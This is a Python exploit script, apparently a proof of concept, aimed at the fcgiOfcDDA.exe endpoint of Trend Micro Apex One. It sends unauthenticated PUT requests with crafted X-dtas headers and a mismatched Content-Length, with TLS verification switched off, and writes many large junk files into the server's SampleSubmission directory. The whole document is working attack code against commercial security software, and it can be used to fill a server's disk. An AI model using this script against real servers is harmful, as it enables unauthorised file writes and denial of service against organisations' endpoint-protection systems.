import sys, requests, argparse, random, string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def rand_str(size=10, chars=string.ascii_uppercase + string.digits):
  return ''.join(random.choice(chars) for _ in range(size))


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

descr = 'Trend Micro Apex One fcgiOfcDDA.exe File Upload'
parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target', required=True, help='Target host/IP')
parser.add_argument('-p', '--port', type=int, default=4343, help='Apex One Server port, default: %(default)s')
parser.add_argument('-c', '--count', type=int, default=10, help='number of files to create, default: %(default)s')
parser.add_argument('-s', '--size', type=int, default=1000000,help='number of random characters to write to the file, default: %(default)s')

args = parser.parse_args()
host = args.target
port = args.port
fcount = args.count
fsize = args.size

msize = 29999999
if fsize > msize:
  sys.exit('Max file size is {}'.format(msize))
  
fdata = b'\x00' * fsize 

url = 'https://{}:{}/officescan/console/html/cgi/fcgiOfcDDA.exe'.format(host, port)

for i in range(fcount):
  fname = rand_str(16)
  print('Writing {} bytes to file {} in the SampleSubmission directory...'.format(fsize, fname))

  headers = {
    'X-dtas-uri' : 'upload_sample',
    'X-dtas-Archive-Filename': fname,
  }  

  s = requests.Session()
  req = requests.Request('PUT', url, data=fdata, headers=headers)
  prepped = req.prepare()
  prepped.headers['Content-Length'] = len(fdata) + 1

  try:
    s.send(prepped, timeout=1, verify=False)
  except: pass

print('\nPlease check contents in <APEX_ONE_INSTALLATION_DIR>\PCCSRV\TEMP\SampleSubmission\\')
